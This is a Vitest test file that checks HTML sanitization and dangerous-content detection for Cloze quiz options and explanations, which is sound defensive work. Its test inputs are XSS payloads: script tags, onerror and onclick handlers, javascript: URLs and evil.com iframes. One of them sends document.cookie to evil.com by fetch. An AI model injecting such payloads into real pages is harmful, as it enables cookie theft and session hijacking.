/**
 * Tests for XSS sanitization in Cloze components
 */

import { describe, it, expect } from 'vitest'
import { sanitizeInline, sanitizePassage, containsDangerousContent } from '@/lib/sanitize'

describe('Cloze XSS sanitization', () => {
  describe('sanitizeInline (for options)', () => {
    it('should remove script tags', () => {
      const malicious = '<script>alert("XSS")</script>however'
      const result = sanitizeInline(malicious)

      expect(result).not.toContain('<script>')
      expect(result).not.toContain('alert')
      expect(result).toBe('however')
    })

    it('should remove onerror attributes', () => {
      const malicious = '<img src=x onerror="alert(1)">however'
      const result = sanitizeInline(malicious)

      expect(result).not.toContain('onerror')
      expect(result).not.toContain('alert')
    })

    it('should remove javascript: URLs', () => {
      const malicious = '<a href="javascript:alert(1)">however</a>'
      const result = sanitizeInline(malicious)

      expect(result).not.toContain('javascript:')
      expect(result).not.toContain('alert')
    })

    it('should allow safe inline markup', () => {
      const safe = '<em>however</em>'
      const result = sanitizeInline(safe)

      expect(result).toContain('<em>')
      expect(result).toContain('however')
    })

    it('should allow mark tags for highlighting', () => {
      const safe = 'This is <mark>however</mark> important'
      const result = sanitizeInline(safe)

      expect(result).toContain('<mark>')
      expect(result).toContain('however')
    })
  })

  describe('sanitizePassage (for full explanations)', () => {
    it('should remove script tags from explanation', () => {
      const malicious = '<p>Explanation</p><script>alert("XSS")</script>'
      const result = sanitizePassage(malicious)

      expect(result).not.toContain('<script>')
      expect(result).not.toContain('alert')
      expect(result).toContain('Explanation')
    })

    it('should remove iframe tags', () => {
      const malicious = '<p>Text</p><iframe src="evil.com"></iframe>'
      const result = sanitizePassage(malicious)

      expect(result).not.toContain('<iframe>')
      expect(result).not.toContain('evil.com')
    })

    it('should remove event handlers from all elements', () => {
      const malicious = '<p onclick="alert(1)">Click me</p>'
      const result = sanitizePassage(malicious)

      expect(result).not.toContain('onclick')
      expect(result).not.toContain('alert')
      expect(result).toContain('Click me')
    })

    it('should allow safe passage markup', () => {
      const safe = '<p>This is a <strong>转折</strong> relationship.</p>'
      const result = sanitizePassage(safe)

      expect(result).toContain('<p>')
      expect(result).toContain('<strong>')
      expect(result).toContain('转折')
    })

    it('should preserve line breaks', () => {
      const safe = '<p>First line</p><br/><p>Second line</p>'
      const result = sanitizePassage(safe)

      expect(result).toContain('<br')
      expect(result).toContain('First line')
      expect(result).toContain('Second line')
    })
  })

  describe('containsDangerousContent', () => {
    it('should detect script tags', () => {
      expect(containsDangerousContent('<script>alert(1)</script>')).toBe(true)
      expect(containsDangerousContent('<SCRIPT>alert(1)</SCRIPT>')).toBe(true)
    })

    it('should detect javascript: URLs', () => {
      expect(containsDangerousContent('javascript:alert(1)')).toBe(true)
      expect(containsDangerousContent('JAVASCRIPT:alert(1)')).toBe(true)
    })

    it('should detect event handlers', () => {
      expect(containsDangerousContent('onclick="alert(1)"')).toBe(true)
      expect(containsDangerousContent('onerror=alert(1)')).toBe(true)
      expect(containsDangerousContent('onload="badStuff()"')).toBe(true)
    })

    it('should detect iframe/object/embed', () => {
      expect(containsDangerousContent('<iframe src="x">')).toBe(true)
      expect(containsDangerousContent('<object data="x">')).toBe(true)
      expect(containsDangerousContent('<embed src="x">')).toBe(true)
    })

    it('should not flag safe content', () => {
      expect(containsDangerousContent('<p>Safe content</p>')).toBe(false)
      expect(containsDangerousContent('<strong>Bold text</strong>')).toBe(false)
      expect(containsDangerousContent('Plain text')).toBe(false)
    })
  })

  describe('Real-world Cloze attack vectors', () => {
    it('should sanitize malicious option text', () => {
      const maliciousOption = {
        label: 'A',
        text: '<img src=x onerror="fetch(\'evil.com?cookie=\'+document.cookie)">however',
      }

      const sanitized = sanitizeInline(maliciousOption.text)

      expect(sanitized).not.toContain('onerror')
      expect(sanitized).not.toContain('fetch')
      expect(sanitized).not.toContain('cookie')
    })

    it('should sanitize malicious reason text', () => {
      const maliciousReason = '因果關係<script>steal()</script>不符'
      const sanitized = sanitizeInline(maliciousReason)

      expect(sanitized).not.toContain('<script>')
      expect(sanitized).not.toContain('steal')
      expect(sanitized).toContain('因果關係')
      expect(sanitized).toContain('不符')
    })

    it('should sanitize malicious passage with multiple attack vectors', () => {
      const maliciousPassage = `
        <p>Normal paragraph</p>
        <script>alert(document.cookie)</script>
        <img src=x onerror="alert(1)">
        <a href="javascript:void(0)">Click</a>
        <iframe src="evil.com"></iframe>
      `

      const sanitized = sanitizePassage(maliciousPassage)

      expect(sanitized).not.toContain('<script>')
      expect(sanitized).not.toContain('onerror')
      expect(sanitized).not.toContain('javascript:')
      expect(sanitized).not.toContain('<iframe>')
      expect(sanitized).toContain('Normal paragraph')
    })
  })
})
